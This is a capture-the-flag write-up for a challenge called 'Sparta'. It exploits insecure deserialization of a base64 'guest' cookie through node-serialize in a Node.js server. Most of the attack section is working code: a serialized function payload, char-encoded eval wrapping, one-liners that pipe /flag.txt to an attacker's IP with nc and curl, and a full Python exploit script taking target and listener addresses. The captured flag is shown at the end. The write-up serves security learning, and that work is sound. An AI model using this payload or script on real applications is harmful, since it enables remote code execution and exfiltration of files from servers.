# Sparta

RCE using insecure deserialization vulnerability in `server.js` file. 

## Enumeration
When I went to the challenge website, at first it didn't let me in because "Unsafe port". So I had to allow that port in firefox settings. 

After the small issue, I checked `server.js` file if it had something interesting. Immediately I saw that it required `node-serialize` module. Usually in ctf:s when serialize module is imported, challenge requires exploiting the unserialize feature. 

Then I scrolled down and found this odd POST request
```javascript
app.post('/guest', function(req, res) {

   if (req.cookies.guest) {
   	var str = new Buffer(req.cookies.guest, 'base64').toString();
   	var obj = serialize.unserialize(str);
   	if (obj.username) {
     	res.send("Hello " + escape(obj.username) + ". This page is currently under maintenance for Guest users. Please go back to the login page");
   }
 } else {
	 var username = req.body.username
	 var country = req.body.country
	 var city = req.body.city
	 var serialized_info = `{"username":"${username}","country":"${country}","city":"${city}"}`
     var encoded_data = new Buffer(serialized_info).toString('base64');
	 res.cookie('guest', encoded_data, {
       maxAge: 900000,
       httpOnly: true
     });
 }
 res.send("Hello!");
});
```

We see that when doing a POST request to the `/guest` page, it first checks whether cookie `guest` exists. 

## Exploiting
I googled for how to get remote code execution with deserialization and I found this article: [Deserialization in node.js](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/)

The example code in the article looked pretty similar to the challenge code. I first created a serialized javascript object that the web application will deserialize and execute it.

```javascript
{"rce":"_$$ND_FUNC$$_function (){var exec = require('child_process').exec;exec('cat flag.txt'}()"}
```

Now I copied the python script from the article to generate the buffered data. However I edited the script to suit my needs. 

First I encoded the characters and added it to the `eval()` function. 
```python
print("[+] Crafting the payload")
NODEJS_REV_SHELL = f"var exec = require('child_process').exec;exec('cat /flag.txt | nc {ip} {port}');"

pchars = charencode(NODEJS_REV_SHELL)
load = "eval(String.fromCharCode(%s))" % (pchars)
```

Next I added the encoded payload into javascript object, which I had created before. After that I base64 encoded the whole object, because web application first decodes it from base64. 

```
payload = '''
{"rce":"_$$ND_FUNC$$_function (){%s}()"}
''' % (load)

payload = b64encode(payload.encode()).decode()
```

After that with requests module, I made a POST request to the website. 

### Problems
When I first launched the exploit, I didn't get any response back. Then I setup the docker and found out it didn't have netcat installed. Because of that I used curl to send the flag to my server. 
With this command I was able to send the flag
```bash
cat /flag.txt | curl {ip}:{port} -d @-
```

### Final exploit
```python
import sys
from base64 import b64encode
import requests

if len(sys.argv) != 4:
    print("Usage: %s <RHOST> <LHOST> <LPORT>" % (sys.argv[0]))
    sys.exit(0)

rhost = sys.argv[1]
ip = sys.argv[2]
port = sys.argv[3]

def charencode(string):
    """String.CharCode"""
    encoded = ''
    for char in string:
        encoded = encoded + "," + str(ord(char))
    return encoded[1:]

print(f"[+] lhost: {ip}")
print(f"[+] lport: {port}")

print("[+] Crafting the payload")
NODEJS_REV_SHELL = f"var exec = require('child_process').exec;exec('cat /flag.txt | curl {ip}:{port} -d @-');"

pchars = charencode(NODEJS_REV_SHELL)
load = "eval(String.fromCharCode(%s))" % (pchars)
payload = '''
{"rce":"_$$ND_FUNC$$_function (){%s}()"}
''' % (load)

payload = b64encode(payload.encode()).decode()

print(payload)
print(f"\n[+] Sending payload to {rhost}")
r = requests.post(f"{rhost}", cookies={"guest": payload})

```

Running the exploit returned the flag
```bash
POST / HTTP/1.1
Host: localhost
User-Agent: curl/7.64.0
Accept: */*
Content-Length: 53
Content-Type: application/x-www-form-urlencoded

zh3r0{4ll_y0u_h4d_t0_d0_w4s_m0v3_th3_0bjc3ts_3mper0r}
```

